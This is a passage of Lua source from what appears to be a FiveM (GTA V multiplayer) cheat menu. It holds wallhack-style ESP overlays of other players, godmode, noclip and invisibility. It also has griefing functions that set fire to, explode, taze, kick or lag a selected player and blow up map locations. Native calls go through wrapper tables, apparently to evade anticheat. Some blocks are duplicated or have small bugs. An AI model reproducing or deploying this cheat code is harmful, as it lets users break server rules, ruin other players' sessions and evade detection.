                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                                   local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                   Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                                   Fatasf.n.DrawRect(0, -0.999 / dist, 0.53 / dist, 0.001, 255, 20, 10, 255)
                                   Fatasf.n.DrawRect(0, 0.999 / dist, 0.53 / dist, 0.001, 255, 20, 10, 255)
                                   Fatasf.n.DrawRect(-0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 20, 10, 255)
                                   Fatasf.n.DrawRect(0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 20, 10, 255)
                               end
                           end
                           Fatasf.n.ClearDrawOrigin()
                       end
                   end
                   
                   if Cock.Menu.boxes then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                           local pPed = Fatasf.n.GetPlayerPed(v)
                           if Fatasf.n.IsEntityOnScreen(pPed) then
                               if Cock.Menu.includeself then
                                   er = nil
                               else
                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < Cock.Sliders['EspDistance'].value+0.0 and pPed ~= er then
                                   local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                                   Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                                   Fatasf.n.DrawRect(0, -0.999 / dist, 0.53 / dist, 0.001, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(0, 0.999 / dist, 0.53 / dist, 0.001, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(-0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 255, 255, 255)
                                   Fatasf.n.DrawRect(0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 255, 255, 255)
                               end
                           end
                           Fatasf.n.ClearDrawOrigin()
                       end
                   end
           
                       if Cock.Menu.infos then
                           for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                               local player = Fatasf.n.GetPlayerPed(v)
                               if Cock.Menu.includeself then
                                   er = nil
                               else
                                   er = Fatasf.n.PlayerPedId()
                               end
                               if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(player), Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true) < Cock.Sliders['EspDistance'].value+0.0 and player ~= er then
                                   local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(player))
                                   local position = Fatasf.n.GetEntityCoords(player)
                                   
                                   local xx = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerX))
                                   local yy = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerY))
                                   local zz = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerZ))
                                   local pos = {x = xx, y = yy, z = zz}
   
                                   local text = 'Nick: '..Fatasf.n.GetPlayerName(v)..' | Health: '..(Fatasf.n.GetEntityHealth(player) - 100)..'/100 | ID: '..Fatasf.n.GetPlayerServerId(v)..''
                                   CockT.Global.DrawTextOnCoords(position.x, position.y, position.z+1.0, text, 255, 255, 255, 4, 0.10)
                               end
                           end
                       end
                       if Cock.Menu.displayradar then
                           CockT.Inv["Invoke"](CockT.Natives["DisplayRadar"], true)
                       end
                       
               
                   if Cock.Menu.skeletons then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                           local ped = Fatasf.n.GetPlayerPed(v)
                           local Pped = Fatasf.n.PlayerPedId()
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(ped), Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true) < Cock.Sliders['EspDistance'].value+0.0 and ped ~= er then
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 11816, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 11816, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 16335, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 11816, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 46078, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 16335, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 52301, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 46078, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 14201, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 46078, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 14201, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 40269, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 45509, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 40269, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 28252, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 45509, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 61163, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 28252, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                               Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 61163, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 18905, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           end
                           --[[if ped ~= Fatasf.n.PlayerPedId() then
                               CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Functions.f.GetPedBoneCoords(ped, 0x796E, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.3 / GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(ped), true), 0.3 / GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(ped), true), 0.4 / GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(ped), true), 255, 255, 255, 255, false, false, 2, nil, nil, true)   --false, false, 2, nil, nil, true, true)
                           end]]
                       end 
                   end
       
                   if #Cock.Notifications > 0 then
                        for notificationIndex = 1, #Cock.Notifications do
                           notification = Cock.Notifications[notificationIndex]
                    
                           if notification then
                               notification['opacity'] = (notification['opacity'] or (notification['time'] / 1000) * 60) - 1
                               local offset = 35.1 - (notificationIndex * 1.0)
                               local timer = (Fatasf.n.GetGameTimer() - notification['startTime']) / notification['time'] * 100 
                               CockT.Global.DrawText(notification['text'], 0.015, 0.023*offset, _outl, 0.3, 4, false)
                               if timer >= 100 then
                                   CockT.Strings.tremove(Cock.Notifications, notificationIndex)
                               end
                            end
                        end
                    end   
                   
                   if Cock.Menu.burnplayercar then
                       CockMeni.Functions.BurnPlayerCar(CockT.Global.SelectedPlayer)
                   end
   
                   if Cock.Menu.fastswim then
                       CockT.Inv["Invoke"](CockT.Natives['SetSwimMultiplierForPlayer'], Fatasf.n.PlayerId(), 1.49)
                   else
                       CockT.Inv["Invoke"](CockT.Natives['SetSwimMultiplierForPlayer'], Fatasf.n.PlayerId(), 1.0)
                   end
                   
                   if Cock.Menu.antidrowing then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedDiesInWater'], Fatasf.n.PlayerPedId(), false)
                   end
   
                   if Cock.Menu.antihead then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedSuffersCriticalHits'], Fatasf.n.PlayerPedId(), false)
                   else
                       CockT.Inv["Invoke"](CockT.Natives['SetPedSuffersCriticalHits'], Fatasf.n.PlayerPedId(), true)
                   end
   
                   if Cock.Menu.fakedead then
                       Fatasf.n.SetPedToRagdoll(Fatasf.n.PlayerPedId(), 4000, 5000, 0, true, true, true)
                   end
   
                   if Cock.Menu.fakedead then
                       Fatasf.n.SetPedToRagdoll(Fatasf.n.PlayerPedId(), 4000, 5000, 0, true, true, true)
                   end
                   
                   if Cock.Menu.wantedlevel then
                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevel'], Fatasf.n.PlayerId(), Cock.Sliders['WantedLVL'].value, false)
                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevelNow'], Fatasf.n.PlayerId())
                   end
   
                   if Cock.Menu.antistungun then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedMinGroundTimeForStungun'], Fatasf.n.PlayerPedId(), 0)
                   elseif not Cock.Menu.antistungun then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedMinGroundTimeForStungun'], Fatasf.n.PlayerPedId(), 3600)
                   end
   
                   if Cock.Menu.noragdoll then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedCanRagdoll'], Fatasf.n.PlayerPedId(), true)
                   else
                       CockT.Inv["Invoke"](CockT.Natives['SetPedCanRagdoll'], Fatasf.n.PlayerPedId(), true)
                   end
                   
                   if Cock.Menu.superrun then
                       if Fatasf.n.IsDisabledControlPressed(0, 34) or Fatasf.n.IsDisabledControlPressed(0, 33) or Fatasf.n.IsDisabledControlPressed(0, 32) or Fatasf.n.IsDisabledControlPressed(0, 35) then
                           Fatasf.n.SetEntityVelocity(Fatasf.n.PlayerPedId(), Fatasf.n.GetOffsetFromEntityInWorldCoords(Fatasf.n.PlayerPedId(), 0.0, 10.5, GetEntityVelocity(Fatasf.n.PlayerPedId())[3]) - Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                       end
                   end
                   
                   if Cock.Menu.ExtraJump then
                       if Fatasf.n.IsDisabledControlJustPressed(0, 22) then
                           CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], Fatasf.n.PlayerPedId(), 3, 0.0, 0.0, 25.0, 0.0, 0.0, 0.0, 0, 0, 0, 1, 1, 1)
                       end
                   end
                   
                   if Cock.Menu.infroll then
                       for i = 0, 3 do
                           CockT.Inv["Invoke"](CockT.Natives['StatSetInt'], Fatasf.n.GetHashKey("mp" .. i .. "_shooting_ability"), 9999, true)
                           CockT.Inv["Invoke"](CockT.Natives['StatSetInt'], Fatasf.n.GetHashKey("sp" .. i .. "_shooting_ability"), 9999, true)
                       end
                   end
   
                   if Cock.Menu.Fire then
                       local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                       local dict = "core"
                       Fatasf.n.RequestNamedPtfxAsset(dict)
                       while not Fatasf.n.HasNamedPtfxAssetLoaded(dict) do
                           CockT.Inv["Wait"](0)
                       end
                       Fatasf.n.UseParticleFxAsset(dict)
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire", coords.x, coords.y, coords.z, 0, 0, 0, 1.0, 0, 0, 0)
                       CockT.Inv["Wait"](10)
                   end
                   
                   if Cock.Menu.Clown then
                       local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                       local dict = "scr_rcbarry2"
                       Fatasf.n.RequestNamedPtfxAsset(dict)
                       while not Fatasf.n.HasNamedPtfxAssetLoaded(dict) do
                           CockT.Inv["Wait"](0)
                       end
                       Fatasf.n.UseParticleFxAsset(dict)
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears", coords.x, coords.y, coords.z, 0, 0, 0, 1.0, 0, 0, 0)
                       CockT.Inv["Wait"](10)
                   end
                   
                   if Cock.Menu.LaunchPlayer then
                       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), 13, 1.0, false, true, 0.0)
                   end
   
                   if Cock.Menu.SpaceX2 then
                       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), 14, 1.0, false, true, 0.0)
                   end
   
                   if Cock.Menu.giveexplosiveammo then
                       local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) 
                       if ret then 
                           Fatasf.n.AddExplosion(position.x, position.y, position.z, 7, 10000.0, true, false, 0)
                       end
                   end
   
                   if Cock.Menu.givemolotovammo then
                       local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) 
                       if ret then 
                           Fatasf.n.AddExplosion(position.x, position.y, position.z, 3, 100.0, true, false, 0)
                       end
                   end
                   if Cock.Menu.givepropammo then
                       local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) 
                       if ret then 
                           local Objects = {'prop_beach_fire', 'prop_atm_01', 'prop_atm_02', 'prop_aircon_s_07a', 'prop_prop_tree_01', 'prop_prop_tree_02'}
                           local objhash = Fatasf.n.GetHashKey(Objects[CockT.Math.random(#Objects)])
                           Fatasf.n.CreateObject(objhash, position.x, position.y, position.z, true, true, true)
                       end
                   end
                   if Cock.Menu.tazeloop then
                       CockT.Global.TazePlayer(CockT.Global.SelectedPlayer)
                   end
                   if Cock.Menu.kickfromveh then
                       CockT.Global.KickFromVehicle(CockT.Global.SelectedPlayer)
                   end
   
                   if Cock.Menu.earrape then
                       CockT.Global.EarRape()
                   end
                   
           
                   if Cock.Menu.Crosshair then
                       Fatasf.n.RequestStreamedTextureDict('srange_gen', true)
                       Fatasf.n.DrawSprite('srange_gen', 'hit_cross', 0.5, 0.5, 0.006, 0.006 * 2.0, 45.0, 255, 255, 255, 255)		--srange_gen@hit_cross
                   end
                   if Cock.Menu.showcoords then
                       local playerPed = Fatasf.n.PlayerPedId()
                       local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(playerPed))
                       playerH = Fatasf.n.GetEntityHeading(playerPed)
                       Functions.f.DrawTextTest(("~b~X~w~: %s ~b~Y~w~: %s ~b~Z~w~: %s ~b~H~w~: %s"):format(CockMeni.Functions.FormatCoord(playerX), CockMeni.Functions.FormatCoord(playerY), CockMeni.Functions.FormatCoord(playerZ), CockMeni.Functions.FormatCoord(playerH)), false, 0.5, 0, 0.5, 0)
                   end
                   if Cock.Menu.roadetector then
                       local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                       ActualRoad = Fatasf.n.GetStreetNameFromHashKey(Fatasf.n.GetStreetNameAtCoord(playerX, playerY, playerZ))
                       Fatasf.n.DrawRect(0.21, 0.798, 0.101, 0.0365, 255, 255, 255, 222)
                       Fatasf.n.DrawRect(0.21, 0.798, 0.1, 0.035, 0, 0, 0, 222)
                       Functions.f.DrawTextTest(ActualRoad, false, 0.35, 0, 0.21, 0.785)
                   end
           
                   if Cock.Menu.blurmenu and CockT.display_menu then
                       CockT.Inv["Invoke"](CockT.Natives['TriggerScreenblurFadeIn'])
                   else
                       CockT.Inv["Invoke"](CockT.Natives['TriggerScreenblurFadeOut'])
                   end
       
                   if Cock.Menu.SJump then
                       Fatasf.n.SetSuperJumpThisFrame(Fatasf.n.PlayerId()) 
                   end
           
                   if Cock.Menu.maxstamina then
                       CockT.Inv["Invoke"](CockT.Natives['ResetPlayerStamina'], Fatasf.n.PlayerId())
                   end
   
                   if Cock.Menu.SemiGodmode then
                       Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), 200)
                   end
                   
                   --[[if Cock.Menu.godmodeglife then
                       Fatasf.n.SetEntityOnlyDamagedByPlayer(Fatasf.n.PlayerPedId(), true)
                       CockT.Global.TriggerCustomEvent(true, "c6cf642b8f1cac1101e23a06aa63600e:setI", true)
                   elseif not Cock.Menu.godmodeglife then
                       Fatasf.n.SetEntityOnlyDamagedByPlayer(Fatasf.n.PlayerPedId(), false)
                       --CockT.Global.TriggerCustomEvent(true, "c6cf642b8f1cac1101e23a06aa63600e:setI", false)
                   end]]
                   if Cock.Menu.glifeunlammo then
                       local _, gun = Fatasf.n.GetCurrentPedWeapon(Fatasf.n.PlayerPedId())
                       Fatasf.n.SetPedAmmo(Fatasf.n.PlayerPedId(), gun, 30)
                   end
                   if Cock.Menu.lootesp then
                       Functions.f.PlayersLootEsp()
                   end
                   if Cock.Menu.getlootglife then
                       Functions.f.GlifeKillAllPeds()
                   end
                   if Cock.Menu.getlootglife2 then
                       Functions.f.GlifeKillAllPeds2()
                   end
                   if Cock.Menu.fastswim then
                       CockT.Inv["Invoke"](CockT.Natives['SetSwimMultiplierForPlayer'], Fatasf.n.PlayerId(), 1.49)
                   else
                       CockT.Inv["Invoke"](CockT.Natives['SetSwimMultiplierForPlayer'], Fatasf.n.PlayerId(), 1.0)
                   end
                   
                   if Cock.Menu.antidrowing then
                       CockT.Inv["Invoke"](CockT.Natives['SetPedDiesInWater'], Fatasf.n.PlayerPedId(), false)
                   end
                   
                   if Cock.Menu.wantedlevel then
                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevel'], Fatasf.n.PlayerId(), Cock.Sliders['WantedLVL'].value, false)
                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevelNow'], Fatasf.n.PlayerId())
                   end
                   
                   if Cock.Menu.antistungun then
                       Fatasf.n.SetPedCanRagdollFromPlayerImpact(Fatasf.n.PlayerPedId(), false)
                   end
   
                   if Cock.Menu.superrun then
                       if Fatasf.n.IsDisabledControlPressed(0, 34) or Fatasf.n.IsDisabledControlPressed(0, 33) or Fatasf.n.IsDisabledControlPressed(0, 32) or Fatasf.n.IsDisabledControlPressed(0, 35) then
                           Fatasf.n.SetEntityVelocity(Fatasf.n.PlayerPedId(), Fatasf.n.GetOffsetFromEntityInWorldCoords(Fatasf.n.PlayerPedId(), 0.0, 10.5, GetEntityVelocity(Fatasf.n.PlayerPedId())[3]) - Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                       end
                   end
                   
                   if Cock.Menu.ExtraJump then
                       if Fatasf.n.IsDisabledControlJustPressed(0, 22) then
                           CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], Fatasf.n.PlayerPedId(), 3, 0.0, 0.0, 25.0, 0.0, 0.0, 0.0, 0, 0, 0, 1, 1, 1)
                       end
                   end
           
                       if Cock.Menu.AFK and not walking then
                           walking = true
                           local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                       
                           if  Fatasf.n.DoesEntityExist(veh) then
                               CockT.Inv["Invoke"](CockT.Natives['TaskVehicleDriveWander'], Fatasf.n.PlayerPedId(), veh, 40.0, 0)
                           else
                               CockT.Inv["Invoke"](CockT.Natives['TaskWanderStandard'], Fatasf.n.PlayerPedId(), 10.0, 10)
                           end
                       end
                       
                       if not Cock.Menu.AFK and walking then
                           Fatasf.n.ClearPedTasks(Fatasf.n.PlayerPedId())
                           walking = false
                       end
       
                   if Cock.Menu.NClip then
                       CockMeni.Functions.instructbutton()
                       currentSpeed = (Cock.Sliders['NoclipSpeed'].value / 10)
                       noclipEntity =
                       Fatasf.n.IsPedInAnyVehicle(Fatasf.n.PlayerPedId(), false) and Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId()) or Fatasf.n.PlayerPedId()
                       Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), true)
                       Fatasf.n.SetEntityInvincible(Fatasf.n.PlayerPedId(), true)
                       
                       local newPos = Fatasf.n.GetEntityCoords(entity)
               
                       Fatasf.n.DisableControlAction(0, 32, true) --MoveUpOnly
                       Fatasf.n.DisableControlAction(0, 268, true) --MoveUp
                       
                       Fatasf.n.DisableControlAction(0, 31, true) --MoveUpDown
               
                       Fatasf.n.DisableControlAction(0, 269, true) --MoveDown
                       Fatasf.n.DisableControlAction(0, 33, true) --MoveDownOnly
                       
                       Fatasf.n.DisableControlAction(0, 266, true) --MoveLeft
                       Fatasf.n.DisableControlAction(0, 34, true) --MoveLeftOnly
                       
                       Fatasf.n.DisableControlAction(0, 30, true) --MoveLeftRight
               
                       Fatasf.n.DisableControlAction(0, 267, true) --MoveRight
                       Fatasf.n.DisableControlAction(0, 35, true) --MoveRightOnly
                       
                       Fatasf.n.DisableControlAction(0, 44, true) --Cover
                       Fatasf.n.DisableControlAction(0, 20, true) --MultiplayerInfo
                       
                       yoff = 0.0
                       zoff = 0.0
                       
                       if Fatasf.n.IsDisabledControlPressed(0, 32) then
                           yoff = 0.5
                       end
                       if Fatasf.n.IsDisabledControlPressed(0, 33) then
                           yoff = -0.5
                       end
                       if Fatasf.n.IsDisabledControlPressed(0, 34) then
                           Fatasf.n.SetEntityHeading(Fatasf.n.PlayerPedId(), Fatasf.n.GetEntityHeading(Fatasf.n.PlayerPedId()) + 3.0)
                       end
                       if Fatasf.n.IsDisabledControlPressed(0, 35) then
                           Fatasf.n.SetEntityHeading(Fatasf.n.PlayerPedId(), Fatasf.n.GetEntityHeading(Fatasf.n.PlayerPedId()) - 3.0)
                       end
                       if Fatasf.n.IsDisabledControlPressed(0, 44) then
                           zoff = 0.21
                       end
                       if Fatasf.n.IsDisabledControlPressed(0, 20) then
                           zoff = -0.21
                       end
           
                       if Fatasf.n.IsDisabledControlPressed(0, 21) then
                           currentSpeed = 8
                       end
           
                       if Fatasf.n.IsDisabledControlPressed(0, 210) then
                           currentSpeed = 0.1
                       end
                       
                       local newPos =
                           Fatasf.n.GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))
                       
                           heading = Fatasf.n.GetEntityHeading(noclipEntity)
                           Fatasf.n.SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
                           Fatasf.n.SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
                           Fatasf.n.SetEntityHeading(noclipEntity, heading)
                           
                           Fatasf.n.SetEntityCollision(noclipEntity, false, false)
                           Fatasf.n.SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)
                           
                           Fatasf.n.FreezeEntityPosition(noclipEntity, false)
                           Fatasf.n.SetEntityInvincible(noclipEntity, false)
                           Fatasf.n.SetEntityCollision(noclipEntity, true, true)  
                   end
           
                   if not CockT.Global.CheckIfResourceExist('gtalife-z') then
                       if Cock.Menu.Godmode then
                           Functions.f.FvckinDooogInvincibleglifeshit(true)
                       elseif not Cock.Menu.Godmode then 
                           Functions.f.FvckinDooogInvincibleglifeshit(false)
                       end
                   end
           
                   --
                   if Cock.Menu.explodeallstations then
                       local c1 = {x=265.26, y=-1259.92, z=29.14} Fatasf.n.AddExplosion(c1.x, c1.y, c1.z, 5, 100.0, true, false, 0.0)
                       local c2 = {x=173.58, y=-1559.83, z=29.0} Fatasf.n.AddExplosion(c2.x, c2.y, c2.z, 5, 100.0, true, false, 0.0)
                       local c3 = {x=-69.18, y=-1761.61, z=29.16} Fatasf.n.AddExplosion(c3.x, c3.y, c3.z, 5, 100.0, true, false, 0.0)
                       local c4 = {x=1206.3, y=-1404.18, z=36.62} Fatasf.n.AddExplosion(c4.x, c4.y, c4.z, 5, 100.0, true, false, 0.0)
                   end
   
                   if Cock.Menu.explodemissionrow then
                       CockT.Global.ExplodeMissionrow()
                   end
                   
       
                   if Cock.Menu.explodegrove then
                       local ppid = Fatasf.n.PlayerPedId()
                       --Fatasf.n.SetEntityCoords(ppid, 99.99, -1068.48, 28.3)
                       Fatasf.n.AddExplosion(124.39, -1929.7, 22.0, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(120.19, -1932.38, 20.74, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(120.41, -1937.65, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(119.18, -1946.69, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(115.06, -1953.9, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(116.23, -1957.94, 20.87, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(111.54, -1961.41, 20.95, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(101.42, -1959.11, 20.08, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(95.92, -1959.12, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(86.24, -1971.49, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(89.41, -1959.04, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(81.24, -1952.1, 20.82, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(76.76, -1958.51, 20.77, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(78.68, -1947.91, 21.17, 20.75, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(78.59, -1939.9, 20.88, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(74.84, -1932.41, 20.84, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(69.07, -1923.82, 21.23, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(79.81, -1905.57, 21.43, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(91.07, -1916.78, 20.77, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(94.26, -1929.64, 20.8, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(102.07, -1938.0, 20.8, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(103.62, -1945.58, 20.77, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(111.27, -1936.94, 20.79, 5, 100.0, true, false, 0.0)
           
                       Fatasf.n.AddExplosion(81.51, -1919.13, 20.94, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(80.14, -1931.2, 20.72, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(96.44, -1927.15, 20.7, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(112.42, -1931.04, 20.61, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(114.67, -1943.08, 20.68, 5, 100.0, true, false, 0.0)
                       Fatasf.n.AddExplosion(102.12, -1951.71, 20.6, 5, 100.0, true, false, 0.0)
                       local gox_dict = "scr_trevor3"					
                       Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                       while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do						
                           CockT.Inv["Wait"](10)				
                       end
                       Fatasf.n.UseParticleFxAsset(gox_dict)
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_trev3_c4_explosion", 99.57, -1937.6, 20.8,0,0,0,100.0,0,0,0)
                   end
       
                   if Cock.Menu.invisible then
                       Fatasf.n.SetEntityVisible(Fatasf.n.PlayerPedId(), false, false) 
                       CockT.Inv["Invoke"](CockT.Natives['SetEntityLocallyVisible'], Fatasf.n.PlayerPedId(), true)  
                       CockT.Inv["Invoke"](CockT.Natives['SetEntityAlpha'], Fatasf.n.PlayerPedId(), Cock.Sliders['InvsAlpha'].value)
                   else 
                       Fatasf.n.SetEntityVisible(Fatasf.n.PlayerPedId(), true, true) 
                       CockT.Inv["Invoke"](CockT.Natives['ResetEntityAlpha'], Fatasf.n.PlayerPedId())
                   end
   
                   if Cock.Menu.taskjump and not Fatasf.n.IsPedInAnyVehicle(Fatasf.n.PlayerPedId()) then
                       if Fatasf.n.IsDisabledControlPressed(1, CockT.Keys["SPACE"]) then
                           CockT.Inv["Invoke"](CockT.Natives['TaskJump'], Fatasf.n.PlayerPedId(), true)
                           CockT.Inv["Wait"](150)
                       end
                   end
           
                   if Cock.Menu.lagplayer then
                       local ped = Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)
                       Fatasf.n.RequestNamedPtfxAsset("scr_agencyheist")
                       local pedcoords = Fatasf.n.GetEntityCoords(ped)
                       Fatasf.n.UseParticleFxAsset("scr_agencyheist")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_fbi_dd_breach_smoke", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                       
